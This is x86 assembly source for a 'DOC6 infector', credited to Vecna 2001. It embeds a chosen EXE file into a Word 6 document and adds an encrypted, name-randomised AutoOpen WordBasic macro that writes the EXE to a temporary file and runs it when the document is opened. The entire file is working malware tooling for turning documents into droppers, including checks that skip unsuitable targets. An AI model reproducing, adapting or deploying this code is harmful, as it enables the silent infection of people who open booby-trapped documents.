;DOC6 infector - insert a EXE file to be runned when the DOC6 is open
;(c) Vecna 2001

.386p
.model flat
locals
.code

by equ byte ptr
wo equ word ptr
dwo equ dword ptr
ofs equ offset

callW macro API
       extrn API:PROC
       call API
endm

infect_doc:
       pushad

       callW GetTickCount
       mov [crypt_key], al

       shr eax, 8
       and eax, 0f0f0fh
       add eax, "aaa"           ;eax=3 variable names

       mov [macro_var1a], al
       mov [macro_var1b], al
       shr eax, 8
       mov [macro_var2a], al
       mov [macro_var2b], al
       mov [macro_var2c], al
       mov [macro_var2d], al
       mov [macro_var2e], al
       mov [macro_var2f], al
       mov [macro_var2g], al
       shr eax, 8
       mov [macro_var3a], al
       mov [macro_var3b], al    ;set variables in WordBasic code

       mov esi, [droppersize]
       lea eax, [esi*4]
       push eax
       push 40h
       callW GlobalAlloc
       mov [msg], ofs error_mem
       test eax, eax
       jz @@error
       mov [macrobuffa], eax

       mov edi, eax
       push edi                 ;inicio do buffer

       mov ecx, [dropper]
       xchg ecx, esi

       lea eax, [esi+ecx]
       mov [limit], eax

       push ecx
       push esi
       mov esi, ofs macro_intro
       mov ecx, macro_intro_size
       rep movsb
       pop esi
       pop ecx

  @@encode:
       mov ebx, edi             ;ebx==onde por size
       stosb
       sub edx, edx
  @@encode1:
       dec ecx
       jz @@done_encode
       lodsb
       test al, al
       jz @@zero
  @@encode2:
       stosb
       inc edx
       cmp dx, 255
       jb @@encode1
  @@encode3:
       mov [ebx], dl
       mov ax, 6a07h
       stosw
       jmp short @@encode
  @@zero:
       push esi
       push eax
       sub ebp, ebp
  @@add1:
       inc ebp
       lodsb
       cmp esi, [limit]
       jae @@done_count
       test al, al
       jz @@add1
  @@done_count:
       pop eax
       pop esi
       cmp ebp, 10
       jb @@encode2
       push ebp
       call @@string$
       sub ecx, ebp
       jbe @@done_encode
       dec ebp
       add esi, ebp
       jmp short @@encode3
  @@done_encode:
       mov [ebx], dl

       mov esi, ofs macro_coda
       mov ecx, macro_coda_size
       rep movsb

       mov eax, 01b1a64h
       stosd                    ;END SUB
       dec edi

       pop eax
       sub edi, eax             ;edi==macrosize
       mov [macrosize], edi
       add edi, template_size
       mov [total_size], edi

       add edi, 1ffh
       and edi, -200h
       mov [addsize], edi

       mov [msg], ofs error_file
       sub ebp, ebp
       push ebp
       push 80h
       push 3
       push ebp
       push ebp
       push 0C0000000h
       push dwo [esp+8*4+6*4+4]
       callW CreateFileA
       mov [handle1], eax
       inc eax
       jz @@error

       push 0
       push [handle1]
       callW GetFileSize
       mov [hostsize], eax
       mov esi, eax
       add esi, [addsize]

       push ebp
       push esi
       push ebp
       push 4
       push ebp
       push [handle1]
       callW CreateFileMappingA
       mov [handle2], eax
       test eax, eax
       jz @@error1

       push esi
       push ebp
       push ebp
       push 2
       push eax
       callW MapViewOfFile
       mov [handle3], eax
       test eax, eax
       jz @@error2

       mov eax, [hostsize]
       test eax, 1ffh
       jnz @@error3
       cmp eax, 800000
       ja @@error3

       mov [msg], ofs error_nodoc
       mov esi, [handle3]
       mov edi, esi
       cmp wo [esi], 0cfd0h     ;d0cf->docfile
       jne @@error3
       cmp wo [esi+1eh], 9      ;setores de tamanho 512
       jne @@error3
       cmp dwo [esi+44h], -2    ;2§ FAT ptr unsupported
       jne @@error3

       mov [msg], ofs error_nostream
       lea edx, [esi+4ch]       ;+++edx==fatdir
       imul eax, [esi+30h], 512
       lea esi, [esi+eax+512+80h]
       call @@checksum
       add ebx, -("W"+"o"+"r"+"d"+"D"+"o"+"c"+"u"+"m"+"e"+"n"+"t")
       jz @@valid
       add esi, 80h-12*2
       call @@checksum
       xor ebx, "W"+"o"+"r"+"d"+"D"+"o"+"c"+"u"+"m"+"e"+"n"+"t"
  @@valid:
       jnz @@error3

       lea eax, [esi+78h-12*2]
       mov ecx, [eax]
       cmp ecx, 1000h   ;use mini-FAT?
       jb @@error3
       mov [doc_ptr2size], eax
       mov [doc_len], ecx

       mov eax, [esi+74h-12*2]
       mov [doc_stream], eax  ;wordoc stream
       imul eax, eax, 512
       lea eax, [edi+eax+512]

       mov [msg], ofs error_nofib
       cmp wo [eax], 0a5dch           ;assinatura da FIB nao bate
       jne @@error3

       mov [msg], ofs error_psw
       bt dwo [eax+0ah], 8
       jc @@error3          ;tem senha
       mov [msg], ofs error_mac
       bt dwo [eax+13h], 0
       jc @@error3          ;usado ultima vez num Mac
       mov [msg], ofs error_macro
       bts dwo [eax+0ah], 0
       jc @@error3          ;ja tem macros

       mov ecx, [total_size]
       add ecx, 1ffh
       shr ecx, 9
       mov eax, [hostsize]
       shr eax, 9
       dec eax
       mov esi, eax
       lea ebx, [eax+ecx]
       and ebx, -80h
       and esi, -80h
       sub esi, ebx
       jz @@add_sector                   ;still inside
       shr ebx, 7-2
       mov [edx+ebx], eax
       inc eax
  @@add_sector:
       mov [doc_sectorentry], eax    ;first sector of virus macro
  @@add_loop:
       call @@docfat_convert
       inc eax
       mov [ebx+esi*4], eax             ;alloc sector
       loop @@add_loop

       mov eax, [doc_stream]
       mov ecx, [doc_len]
       sub ecx, 512
  @@find_next:
       call @@docfat_convert
       mov eax, [ebx+esi*4]
       sub ecx, 512
       jnb @@find_next

       call @@docfat_convert
       mov eax, [doc_sectorentry]
       mov dwo [ebx+esi*4], eax

       mov eax, [doc_len]
       add eax, 1ffh
       and eax, -200h
       imul ebx, [doc_stream], 512
       lea ebx, [edi+ebx+512]
       mov [ebx+118h], eax
       mov dwo [ebx+11ch], template_size
       lea ecx, [eax+template_size]
       mov [macropos], ecx
       add eax, [total_size]
       mov [ebx+20h], eax
       mov edx, [doc_ptr2size]
       mov [edx], eax

       add edi, [hostsize]
       mov dl, [crypt_key]
       mov esi, ofs macro_bin
       mov ecx, template_size
       rep movsb

       mov esi, [macrobuffa]
       mov ecx, [macrosize]
       mov ah, [crypt_key]
       push esi
  @@crypt_macro:
       lodsb
       xor al, ah
       stosb
       loop @@crypt_macro

       callW GlobalFree

       mov eax, [addsize]
       add [hostsize], eax
       mov [msg], ofs error_noerror

  @@error3:
       push [handle3]
       callW UnmapViewOfFile
  @@error2:
       push [handle2]
       callW CloseHandle
  @@error1:
       push 0
       push 0
       push [hostsize]
       push [handle1]
       callW SetFilePointer
       push [handle1]
       callW SetEndOfFile
       push [handle1]
       callW CloseHandle
  @@error:
       popad
       ret 4

  @@checksum:
       push 12
       sub eax, eax
       sub ebx, ebx
       pop ecx
  @@next:
       lodsw
       add ebx, eax
       loop @@next
       ret

  @@docfat_convert:
       mov esi, eax
       shr esi, 7
       mov ebx, [edx+esi*4]
       imul ebx, ebx, 512
       lea ebx, [edi+ebx+512]           ;ebx=FAT sector ptr
       mov esi, eax
       and esi, 7fh                     ;esi=FAT index
       ret

  @@string$:
       mov eax, 800b6707h
       stosd
       mov eax, [esp+4]
       shl eax, 16
       mov ax, 6c05h
       stosd
       mov eax, 00006c12h
       stosd
       mov al, 6
       stosb
       ret 4

main:
       push ofs openstruct_exe
       callW GetOpenFileNameA
       test eax, eax
       jz @@error

       sub ebp, ebp
       push ebp
       push 80h
       push 3
       push ebp
       push ebp
       push 0c0000000h
       push ofs filename
       callW CreateFileA
       mov ebx, eax
       inc eax
       mov [msg], ofs error_file
       jz @@error1

       push 0
       push ebx
       callW GetFileSize
       mov [droppersize], eax

       push [droppersize]
       push 40h
       callW GlobalAlloc
       mov [msg], ofs error_mem
       test eax, eax
       jz @@error1
       mov [dropper], eax

       push ebp
       push ofs temp
       push [droppersize]
       push [dropper]
       push ebx
       callW ReadFile

       push ebx
       callW CloseHandle

       push ofs openstruct_doc
       callW GetOpenFileNameA
       test eax, eax
       jz @@error

       push ofs filename
       call infect_doc
  @@error1:
       push 0
       push ofs titulo
       push [msg]
       push 0
       callW MessageBoxA
  @@error:
       push 0
       callW ExitProcess

.data

titulo db "DOC6 Infector",0

error_mem      db "Error allocating memory...",0
error_file     db "Error opening file...",0
error_nodoc    db "File is not a DOC6 file",0
error_nostream db "No WordDoc stream found",0
error_nofib    db "FIB signature dont match",0
error_psw      db "DocFile as a password",0
error_mac      db "DocFile last edited in a Mac",0
error_macro    db "DocFile already have macros",0
error_noerror  db "DOC file infected!",0

macro_bin:
       dd 000101ffh
       db 55h
crypt_key db 0
       dw 00001
       dd 0ffff0000h
       dd 0
macrosize dd 0
       dd 4
macropos dd 0
       dd 0510h
       dd 01110001h
       dd 08000100h
       db "AUTOOPEN"
       dw 4000h
template_size equ $-macro_bin

macro_intro:
       dw 1
       db 64h
       db 1bh
       db 69h
       db 04h
       db "MAIN"                       ;SUB MAIN
       db 64h
       db 69h
       db 01
  macro_var1a db 0
       db 0ch                        ;A=
       db 6ah
macro_intro_size equ $-macro_intro

macro_coda:
       db 64h                          ;B=
       db 69h
       db 1
  macro_var2a db 0
       db 0Ch
       db 67h
       db 8ch
       db 81h
       db 5
       db 6Ch
       dw 11
       db 6
       db 7
       db 6Ah
       db 1
       db "\"
       db 64h                         ; for i=
       db 23h
       db 69h
       db 1
  macro_var3a db 0
       db 0Ch
       db 6Ch
       dw 1
       db 24h
       db 6Ch                          ;to
       dw 8
       db 64h                         ; t$=t$+
       db 69h
       db 1
  macro_var2b db 0
       db 0Ch
       db 69h
       db 1
  macro_var2c db 0
       db 7
       db 67h
       db 5
       db 80h
       db 5
       db 67h
       db 2
       db 80h
       db 5
       db 67h
       db 0Eh
       db 80h
       db 5
       db 6
       db 0Ah
       db 6Ch
       dw 26
       db 7
       db 6Ch
       dw "A"
       db 6
       db 6
       db 64h                         ; next
       db 26h
       db 69h
       db 1
  macro_var3b db 0
       db 64h                         ; t$=t$+
       db 69h
       db 1
  macro_var2d db 0
       db 0Ch
       db 69h
       db 1
  macro_var2e db 0
       db 7
       db 6Ah
       db 4
       db '.TMP'
       db 64h                         ; open t$
       db 3Dh
       db 69h
       db 1
  macro_var2f db 0
       db 23h
       db 3Bh
       db 34h
       db 71h
       db 6Ch
       dw 1
       db 64h                        ; print
       db 36h
       db 71h
       db 6Ch
       dw 1
       db 12h
       db 69h
       db 01
  macro_var1b db 0
       db 64h                        ; close
       db 4Ch
       db 71h
       db 6Ch
       dw 1
       db 64h                        ; shell
       db 67h
       db 2Dh
       db 80h
       db 69h
       db 1
  macro_var2g db 0
       db 12h
       db 6Ch
       dw 4
macro_coda_size equ $-macro_coda

help1   db 'Escolha o EXE a ser inserido...', 0
help2   db 'Escolha o DOC (formato 6) a ser infectado...', 0

filters db 'EXE files', 0
        db '*.EXE', 0
        db 'DOC files', 0
        db '*.DOC', 0
        db 'All files', 0
        db '*.*', 0
        dd 0

openstruct_exe:
        dd ofs openstruct_doc_end-ofs openstruct_doc
        dd 0
        dd 0
        dd ofs filters
        dd 0
        dd 0
        dd 1
        dd ofs filename
        dd 104h
        dd 0
        dd 0
        dd 0
        dd ofs help1
        dd 201004h
        dw 0
        dw 0
        dd 0
        dd 0
        dd 0
        dd 0

openstruct_doc:
        dd ofs openstruct_doc_end-ofs openstruct_doc
        dd 0
        dd 0
        dd ofs filters
        dd 0
        dd 0
        dd 2
        dd ofs filename
        dd 104h
        dd 0
        dd 0
        dd 0
        dd ofs help2
        dd 201004h
        dw 0
        dw 0
        dd 0
        dd 0
        dd 0
        dd 0
openstruct_doc_end:

.data?
handle1 dd ?
handle2 dd ?
handle3 dd ?
dropper dd ?
droppersize dd ?
limit   dd ?
macrobuffa dd ?
total_size dd ?
addsize dd ?
hostsize dd ?
doc_ptr2size dd ?
doc_len dd ?
doc_stream dd ?
doc_sectorentry dd ?
temp    dd ?
msg     dd ?
filename db 104h dup (?)

end    main

